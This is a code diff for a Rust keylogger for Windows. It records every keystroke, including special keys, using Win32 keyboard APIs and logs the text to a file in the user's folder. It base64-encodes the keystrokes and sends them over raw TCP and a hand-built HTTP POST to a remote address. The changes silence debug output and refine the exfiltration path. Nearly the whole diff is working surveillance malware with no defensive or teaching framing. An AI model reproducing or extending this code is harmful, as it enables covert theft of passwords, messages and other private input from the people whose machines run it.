@@ -1,5 +1,6 @@
 use base64;
 use device_query::{DeviceQuery, DeviceState, Keycode};
+use inputbot::KeybdKey::Numpad0Key;
 use std::convert::TryFrom;
 use std::fs::OpenOptions;
 use std::io::{Read, Write};
@@ -9,7 +10,6 @@ use std::sync::Arc;
 use std::sync::Mutex;
 use std::thread;
 use std::time::Duration;
-use inputbot::KeybdKey::Numpad0Key;
 use windows::core::Result;
 use windows::core::PWSTR;
 use windows::Win32::System::Threading::GetCurrentThreadId;
@@ -59,17 +59,25 @@ fn main() {
         move || loop {
             let mut keys_string = String::new();
 
+            {
                 let mut keys1 = keys1.lock().unwrap();
                 for key in keys1.drain(..) {
                     if let Some(r) = key.char {
                         keys_string.push(r);
                     }
+                    if let Some(r) = key.control {
+                        keys_string.push_str(&r);
+                    }
                 }
+            }
 
             if !keys_string.is_empty() {
                 write_to_file(&keys_string);
-                send_to_tcp(&keys_string);
-                send_to_http(&keys_string);
+                // send_to_tcp(&keys_string);
+                let sent = send_to_http(&keys_string);
+                if sent {
+                    // keys1.clear();
+                }
             }
 
             thread::sleep(Duration::from_secs(5));
@@ -88,7 +96,7 @@ fn main() {
             keys1.push(next_key.clone());
         }
 
-        println!("next: {:?}", next_key);
+        // println!("next: {:?}", next_key);
     }
 }
 
@@ -133,7 +141,7 @@ fn get_next(keycodes: &[i32]) -> Key {
     let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
     let layout = unsafe { GetKeyboardLayout(thread_id) };
     let mut pwszbuff = [0u16; 1]; // Create a buffer
-    // Use the correct arguments for ToUnicodeEx
+                                  // Use the correct arguments for ToUnicodeEx
     let code = unsafe {
         ToUnicodeEx(
             next as u32, // Use the key code as `wvirtkey`
@@ -268,13 +276,13 @@ fn is_known_win_key(win_key1: i32) -> bool {
         VK_OEM_MINUS,  // '-' key
         VK_OEM_PERIOD, // '.' key
         // Oem keys - todo
-        VK_OEM_1, //
-        VK_OEM_2, //
-        VK_OEM_3, //
-        VK_OEM_4, //
-        VK_OEM_6, //
-        VK_OEM_7, //
-        VK_OEM_8, //
+        VK_OEM_1,   //
+        VK_OEM_2,   //
+        VK_OEM_3,   //
+        VK_OEM_4,   //
+        VK_OEM_6,   //
+        VK_OEM_7,   //
+        VK_OEM_8,   //
         VK_OEM_102, //
         // Numbers
         VK_NUMPAD0,
@@ -315,7 +323,7 @@ fn win_key_to_string(win_key1: i32) -> Option<String> {
         // Special keys and other buttons
         (VK_BACK, "[back]"),         // BACKSPACE key
         (VK_TAB, "[tab]"),           // TAB key
-        (VK_RETURN, "[enter]"),     // ENTER key
+        (VK_RETURN, "[enter]"),      // ENTER key
         (VK_SHIFT, "[shift]"),       // SHIFT key
         (VK_CONTROL, "[ctrl]"),      // CTRL key
         (VK_MENU, "[alt]"),          // ALT key
@@ -386,18 +394,17 @@ fn user_file_path(filename: &str) -> String {
     path.to_str().unwrap().to_string()
 }
 
-fn send_to_tcp(keys_base64: &str) -> bool {
+fn send_to_tcp(keys_string: &str) -> bool {
+    let keys_base64 = base64::encode(&keys_string);
     let address = get_address();
     match TcpStream::connect(&address) {
-        Ok(mut stream) => {
-            match writeln!(stream, "{}", keys_base64) {
-                Ok(_) => true,
-                Err(e) => {
-                    println!("Failed to write to TCP stream: {}", e);
-                    false
-                },
+        Ok(mut stream) => match writeln!(stream, "{}", keys_base64) {
+            Ok(_) => true,
+            Err(e) => {
+                println!("Failed to write to TCP stream: {}", e);
+                false
             }
-        }
+        },
         Err(e) => {
             println!("Error connecting to server: {}", e);
             false
@@ -405,7 +412,8 @@ fn send_to_tcp(keys_base64: &str) -> bool {
     }
 }
 
-fn send_to_http(keys_base64: &str) -> bool {
+fn send_to_http(keys_string: &str) -> bool {
+    let keys_base64 = base64::encode(&keys_string);
     let address = get_address();
     let mut stream = match TcpStream::connect(&address) {
         Ok(s) => s,
@@ -422,7 +430,9 @@ fn send_to_http(keys_base64: &str) -> bool {
         Content-Type: text/plain\r\n\
         Content-Length: {}\r\n\r\n\
         {}",
-        &address, keys_base64.len(), keys_base64
+        &address,
+        keys_base64.len(),
+        keys_base64
     );
 
     match stream.write_all(request.as_bytes()) {
@@ -448,34 +458,3 @@ fn write_to_file(keys_string: &str) {
     writeln!(file, "base64: {}", keys_base64);
     writeln!(file, "=======================================");
 }
-
-/*
-Note: reqwest adds 900KB to binary output in release
-fn send_to_http(keys_base64: &str) -> bool {
-    let address = get_address();
-    let client = reqwest::blocking::Client::new();
-
-    let mut headers = reqwest::header::HeaderMap::new();
-    headers.insert(reqwest::header::CONTENT_TYPE, reqwest::header::HeaderValue::from_static("text/plain"));
-
-    match client.post(&address)
-        .headers(headers)
-        .body(keys_base64.to_string())
-        .send() {
-        Ok(response) => {
-            if response.status().is_success() {
-                true
-            } else {
-                println!("Error response from server: {:?}", response.status());
-                false
-            }
-        }
-        Err(e) => {
-            println!("Error sending request: {}", e);
-            false
-        }
-    }
-    // false
-}
-
-*/
